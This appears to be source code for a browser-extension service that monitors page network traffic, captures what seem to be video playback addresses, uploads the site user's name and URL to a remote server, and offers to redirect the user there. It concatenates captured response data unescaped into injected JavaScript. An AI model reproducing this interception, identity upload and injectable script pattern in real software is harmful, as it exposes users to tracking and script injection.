class CommonClientService extends BaseClientService {
    //Constructor
    constructor() {
        // myUtils.log('enter CommonClientService Construction method');
        //Call the parent class constructor first
        super();
        //Network monitoring related service parameters
        this.nwMatchReqRegStr = '';
        this.nwMatchResRegStr = '';
        this.logToPage = false;
        //others
        myUtils.log('hit the current page:' + window.location.href, true);
    }

    async run() {
        //Network monitoring is also enabled on non-entry pages
        this.monitorNetWork();
        // alert('hit the current page:'+window.location.href);
        await myUtils.sleepSyncPromise(1000);
        this.uploadClientStatus();
    }


    //Upload client state
    uploadClientStatus() {
        let sendData = {
            clsName: 'ClientHandle',
            op: 'syncClientStatus',
            host: myUtils.getTargetCurrentUrl(),
            data: {
                siteVipUser: this.getCurUserName(),
                uploadDateTime: myUtils.formatDate((new Date()), 'yyyy-MM-dd hh:mm:ss')
            }
        };
        //myUtils.log('Client working status upload server:' + JSON.stringify(sendData));
        this.wsSendMessage(sendData);
    }

    //Collect data
    async gatherUpload() {

    }


    monitorNetWork(strReqReg, strResReg, cbFunc) {
        if (!strReqReg && !strResReg && !this.nwMatchReqRegStr && !this.nwMatchResRegStr) {
            //myUtils.log('Current page skip network monitor...');
            return false;
        }
        myUtils.log('Enable current page network monitoring...');
        'undefined' === typeof strReqReg ? strReqReg = this.nwMatchReqRegStr : false;
        'undefined' === typeof strResReg ? strResReg = this.nwMatchResRegStr : false;
        //Auxiliary variable to make sure it only pops once
        window.confirmCount = 0;
        if ('undefined' === typeof cbFunc) {
            // javascript-obfuscator:disable
            cbFunc = (frontUrl, resp) => {
                //Note: the current scope is in the background
                if (frontUrl && resp) {
                    // let frontJs='clientService.uploadCurVideoInfo("'+resp+'");';
                    // let appendJs='if(++window.confirmCount<2&&confirm("Grab to the official website playback address, whether to jump to the pilot page?")){setTimeout(()=>{ myUtils.redirectUrl("'+dwsChmExtBg.getCurServUrl()+'/DJSPZ/BCD/b3c0e5febe1ec8875cd4a06fa4a99abf270de3f131d83a65f897322edbc22222?url="+myUtils.getTargetCurrentUrl(),false,true);},2000);}';
                    // dwsChmExtBg.sendJsToPageByUrl(frontUrl,frontJs+appendJs);
                    dwsChmExtBg.sendJsToPageByUrl(frontUrl, 'clientService.uploadCurVideoInfo("' + resp + '");' + 'if(++window.confirmCount<2&&confirm("Grab to the official website playback address, whether to jump to the pilot page?")){setTimeout(()=>{ myUtils.redirectUrl("' + dwsChmExtBg.getCurServUrl() + '/DJSPZ/BCD/b3c0e5febe1ec8875cd4a06fa4a99abf270de3f131d83a65f897322edbc22222?url="+myUtils.getTargetCurrentUrl(),false,true);},2000);}');
                }
            };
            // javascript-obfuscator:enable
        }
        let bgJsCode = 'dwsChmExtBg.enableNetworkMonitorByUrl("' + myUtils.getTargetCurrentUrl() + '","' + strReqReg + '","' + strResReg + '",' + cbFunc.toString() + ',false,false);';
        //alert(bgJsCode);
        myUtils.extExeGlobalJs(bgJsCode, (ret) => {
        });
    }
}

